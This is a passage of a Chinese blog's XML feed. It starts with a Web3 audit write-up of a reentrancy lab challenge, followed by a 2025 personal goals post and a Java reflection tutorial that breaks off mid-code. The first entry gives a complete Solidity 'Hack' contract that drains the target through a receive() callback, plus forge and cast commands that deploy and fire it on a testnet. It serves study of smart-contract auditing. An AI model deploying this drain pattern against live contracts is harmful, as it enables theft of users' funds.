//首先检查sender的余额是否大于要提款的钱</span><br><span class="line">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;); // msg.sender是接收方的地址，合约利用Call的方式向msg.sender发送_amout数量的钱</span><br><span class="line">            if(result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">        balances[msg.sender] -= _amount; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在以上存在漏洞的函数中，因为使用了Call,如果作为接受ETH的合约存在receive和fallback函数，就会执行这个函数存在的逻辑。当这两个特殊的回调函数再次执行<code>withdraw</code>就会反复取钱</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502171708168.png" alt="image-20250217170757982"></p><h3 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h3><h4 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8;</span><br><span class="line"></span><br><span class="line">interface IReentrancy &#123;</span><br><span class="line">    function donate(address) external payable;</span><br><span class="line">    function withdraw(uint256) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    IReentrancy private immutable target;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        target = IReentrancy(0xCa69aB382F26857c5508BAF2aC09F15ccFbD9B25);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        target.donate&#123;value: 1e15&#125;(address(this));</span><br><span class="line">        target.withdraw(1e15);</span><br><span class="line"></span><br><span class="line">        require(address(target).balance == 0, &quot;target balance &gt; 0&quot;);</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        uint256 amount = min(1e15, address(target).balance);</span><br><span class="line">        if (amount &gt; 0) &#123;</span><br><span class="line">            target.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function min(uint256 x, uint256 y) private pure returns (uint256) &#123;</span><br><span class="line">        return x &lt;= y ? x : y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先部署攻击合约<code>Hack</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create src/Attack.sol:Hack --account 0x1f --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_KEY --broadcast</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502182234724.png"></p><p>大概的逻辑就是，首先利用Hack合约利用donate函数使得在实例合约中有余额，通过 withdraw()函数的第一层验证。再通过调用实例合约的withdraw()函数实现Re-entrancy attrack。当调用Hack合约中的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send 0xeE911138B13E36DB6E1A2438092A40c0e339D489 &quot;attack&quot; --account 0x1f --rpc-url $SEPOLIA_RPC_URL --value 0.001ether --etherscan-api-key $ETHERSCAN_KEY</span><br></pre></td></tr></table></figure><p>为什么是用0.001ETH呢？因为实例地址本身创建之后就存在0.001ETH的余额</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502171711834.png" alt="image-20250217171138661"></p><p>可以看到首先Hack合约先发了0.001ETH给予实例合约，然后再触发Re-entrancy</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202502182234442.png" alt="image-20250218223419242"></p>]]></content>
      
      
      <categories>
          
          <category> WEB3审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025年计划</title>
      <link href="/2024/12/31/%E6%9D%82%E8%B0%88/2025%E5%B9%B4/"/>
      <url>/2024/12/31/%E6%9D%82%E8%B0%88/2025%E5%B9%B4/</url>
      
        <content type="html"><![CDATA[<h1 align="center">2025年计划</h1><h1 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h1><h2 id="1-全力以赴进行考研，目标暨南大学"><a href="#1-全力以赴进行考研，目标暨南大学" class="headerlink" title="1.全力以赴进行考研，目标暨南大学"></a>1.全力以赴进行考研，目标<code>暨南大学</code></h2><h2 id="2-学习智能合约审计"><a href="#2-学习智能合约审计" class="headerlink" title="2.学习智能合约审计"></a>2.学习<code>智能合约审计</code></h2><h2 id="3-提高个人素质，包括但不限于专注力，体力，脑力，学习能力等"><a href="#3-提高个人素质，包括但不限于专注力，体力，脑力，学习能力等" class="headerlink" title="3.提高个人素质，包括但不限于专注力，体力，脑力，学习能力等"></a>3.提高<code>个人素质</code>，包括但不限于专注力，体力，脑力，学习能力等</h2><h2 id="4-多读书"><a href="#4-多读书" class="headerlink" title="4.多读书"></a>4.<code>多读书</code></h2><h2 id="5-维持好亲密关系"><a href="#5-维持好亲密关系" class="headerlink" title="5.维持好亲密关系"></a>5.维持好亲密关系</h2>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
            <tag> 目标 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反射</title>
      <link href="/2024/05/24/%E4%BB%A3%E5%AE%A1/%E5%8F%8D%E5%B0%84/"/>
      <url>/2024/05/24/%E4%BB%A3%E5%AE%A1/%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 align ="center">反射</h1><p>[TOC]</p><hr><blockquote><p>基于视频学习：<a href="https://www.bilibili.com/video/BV1K4421w7zP/?spm_id_from=333.337.search-card.all.click&vd_source=f1185022f0e78abf85fb9a442c06afcf">Java中的反射 Reflection in Java_哔哩哔哩_bilibili</a></p></blockquote><h1 id="Class对象"><a href="#Class对象" class="headerlink" title="Class对象"></a>Class对象</h1><blockquote><p>在Java中有两种对象：Class对象和实例对象，实例对象是类的实例，通常是通过new关键字构建的。Class对象是JVM生成用来保存对象的类的信息的。Java程序执行之前需要经过编译、加载、链接和初始化这几个阶段，编译阶段会将源码文件编译为.class字节码文件，编译器同时会在.class文件中生成Class对象，加载阶段通过JVM内部的类加载机制，将Class对象加载到内存中。在创建对象实例之前，JVM会先检查Class对象是否在内存中存在，如果不存在，则加载Class对象，然后再创建对象实例，如果存在，则直接根据Class对象创建对象实例。JVM中只有一个Class对象，但可以根据Class对象生成多个对象实例</p><p>每一个类对应着唯一的一个clas对象!</p></blockquote><ul><li>初始代码演示</li></ul><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.entity;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">//private Message message;</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; comments;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">publicStaticField</span> <span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">privateStaticField</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;UserClass is initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age= <span class="number">18</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEmail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myPublicMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My Public Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myPrivateMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My Private Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span>  <span class="title function_">myPrivateMethod</span><span class="params">(String content, String mark)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My Private Method with parameters.&quot;</span>+content+<span class="string">&quot;and&quot;</span>+mark);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">myPublicStaticMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My  PublicStatic Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">myPrivateStaticMethod</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My Private Static Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">myPrivateStaticMethod</span><span class="params">(String content)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My  Private Static Method with parameters.&quot;</span>+content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.test.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">file</span> <span class="operator">=</span> User.publicStaticField;</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        User.myPublicStaticMethod();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;buut&quot;</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(user.name);</span><br><span class="line">        user.myPublicMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Class对象的获取"><a href="#Class对象的获取" class="headerlink" title="Class对象的获取"></a>Class对象的获取</h2><h3 id="利用类名-class"><a href="#利用类名-class" class="headerlink" title="利用类名.class"></a>利用类名.class</h3><ul><li>这个方法不会在加载Class对象后，不会对Class对象进行初始化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        Class&lt;User&gt; userClass = User.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行之后我们可以发现User类中的静态初始块,没有被加载</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的User.class表示User类的字面量引用，它会被编译成对User类的Class对象的引用.这个Class对象允许你在运行时获取User类的信息和操作User类的元数据。Class<User> 类型的userClass变量是一个泛型类型的Class对象，它指定了User类型的元数据。这意味着你可以在编译时期就知道这个Class对象是专门为User类型使用的,这样可以减少类型转换的错误。</p><h3 id="利用getclass方法"><a href="#利用getclass方法" class="headerlink" title="利用getclass方法"></a>利用getclass方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Class &lt;?&gt; clazz = user.getClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用通配符是因为Class的类型是不可知的,所以利用?通配符</span></span><br></pre></td></tr></table></figure><h4 id="利用Class-forName-方法"><a href="#利用Class-forName-方法" class="headerlink" title="利用Class.forName()方法"></a>利用Class.forName()方法</h4><ul><li>这个方法在加载Class对象后，对Class对象进行初始化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行之后我们可以发现执行了User类中的静态初始块</span></span><br></pre></td></tr></table></figure><h1 id="Class对象的操作"><a href="#Class对象的操作" class="headerlink" title="Class对象的操作"></a>Class对象的操作</h1><ul><li>代码演示</li></ul><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String PersonprivateField;   <span class="comment">//因为子类需要用这些属性，所以说我们就将这些变成protected，外部不允许访问</span></span><br><span class="line">    <span class="keyword">public</span> String PersonpublicField;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.entity;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="comment">//private Message message;</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; comments;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">publicStaticField</span> <span class="operator">=</span><span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">privateStaticField</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><h3 id="方法getDeclaredFields"><a href="#方法getDeclaredFields" class="headerlink" title="方法getDeclaredFields()"></a>方法getDeclaredFields()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field : fields) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回User类的所有字段,公有的私有的,但是不会返回父类的公共字段.</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232306439.png" alt="image-20240523230645327"></p><h3 id="方法getFields"><a href="#方法getFields" class="headerlink" title="方法getFields()"></a>方法getFields()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Field[] fields = clazz.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field field : fields) &#123;</span><br><span class="line">            System.out.println(field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回Public类型的字段以及父类的公共字段.</p><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232307240.png" alt="image-20240523230725136"></p><p>获取字段类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;comments&quot;</span>);</span><br><span class="line">        System.out.println(field.getType());</span><br><span class="line">        System.out.println(field.getGenericType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///field.getGenericType()是对于范式的类型获取</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232325076.png" alt="image-20240523232509990"></p><p>获取静态字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;publicStaticField&quot;</span>);</span><br><span class="line">        System.out.println(field.get(<span class="literal">null</span>));</span><br><span class="line">        System.out.println(field.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232335348.png" alt="image-20240523233559283"></p><h3 id="通过setAccessible-true-获取私密字段"><a href="#通过setAccessible-true-获取私密字段" class="headerlink" title="通过setAccessible(true)获取私密字段"></a>通过setAccessible(true)获取私密字段</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;privateStaticField&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        System.out.println(field.get(<span class="literal">null</span>));</span><br><span class="line">        System.out.println(field.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232341703.png" alt="image-20240523234136623"></p><h2 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h2><h3 id="方法getDeclaredMethods"><a href="#方法getDeclaredMethods" class="headerlink" title="方法getDeclaredMethods()"></a>方法getDeclaredMethods()</h3><p>获取所有的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        Method[] methods = clazz.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods)&#123;</span><br><span class="line">            System.out.println(method.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232343505.png" alt="image-20240523234342434"></p><p>获取静态方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException,  IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.test.entity.User&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;myPublicStaticMethod&quot;</span>);</span><br><span class="line">        method.invoke(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-image-dzh.oss-cn-guangzhou.aliyuncs.com/undefined202405232351630.png" alt="image-20240523235144561"></p><p>获取私有静态方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException,  IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = 